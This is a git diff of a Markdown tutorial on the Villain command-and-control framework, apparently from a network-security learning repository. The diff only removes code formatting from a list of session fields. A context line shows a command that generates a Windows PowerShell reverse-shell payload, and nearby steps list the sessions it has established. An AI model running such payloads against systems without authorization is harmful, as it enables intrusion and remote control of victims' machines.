@@ -65,7 +65,7 @@ generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0
 ![1](https://github.com/mishqatabid/Network-Security/assets/145700715/14a21b81-32fb-4aea-a391-cf8f05fcc434)<br>
 
 •	 Now by typing sessions on the Villain terminal, you can see all the possible session that has been established using the payload.<br>
-•	 It contains `Session ID`, `IP Address`, `OS Type`, `User`, `Owner` and `Status`.<br>
+•	 It contains Session ID, IP Address, OS Type, User, Owner and Status.<br>
 ![2](https://github.com/mishqatabid/Network-Security/assets/145700715/2e9c453d-733a-4f26-a2a0-6d2f5fb5daeb)<br>
 ![3](https://github.com/mishqatabid/Network-Security/assets/145700715/5573c2c2-8853-424c-8717-e8e0e623f528)<br>
 
